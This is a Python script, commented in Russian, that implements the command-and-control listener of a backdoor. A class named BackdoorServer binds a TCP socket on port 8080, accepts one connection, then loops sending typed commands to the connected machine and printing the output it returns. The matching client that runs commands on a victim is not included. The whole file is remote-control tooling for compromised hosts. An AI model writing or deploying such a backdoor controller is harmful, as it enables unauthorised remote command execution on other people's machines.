import socket

class BackdoorServer:
    def __init__(self, ip, port):
         self.ip = ip
         self.port = port

    def connect_to_server(self):
        #создаем объект сокета
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #изменить опцию объекта socket
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #поднимаем сервер на этот ip port
        server.bind((self.ip, self.port))
        #количество подключений которые можно добавить в очередь перед тем как подключения начнет сбрасывается
        server.listen(0)
        print(' [+] Waiting for connection...')

        #при получения входяшего сообщ его надо принять 
        connection, adress = server.accept()
        print(f'\n [+] CONNECTED!\n')

        while True:
            command = input('\n /.> ')
            connection.send(command.encode('utf-8'))
            result = connection.recv(3024).decode('utf-8')
            if result:
                print(result)


if __name__ == '__main__':
    IP = socket.gethostbyname(socket.gethostname())
    PORT = 8080
    my_server = BackdoorServer(IP, PORT)
    my_server.connect_to_server()
